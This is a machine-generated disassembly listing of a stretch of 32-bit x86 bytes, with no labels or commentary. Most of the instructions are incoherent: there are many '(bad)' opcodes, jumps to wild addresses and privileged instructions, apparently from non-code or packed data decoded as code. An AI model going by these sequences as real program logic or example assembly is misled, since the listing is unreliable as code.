  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
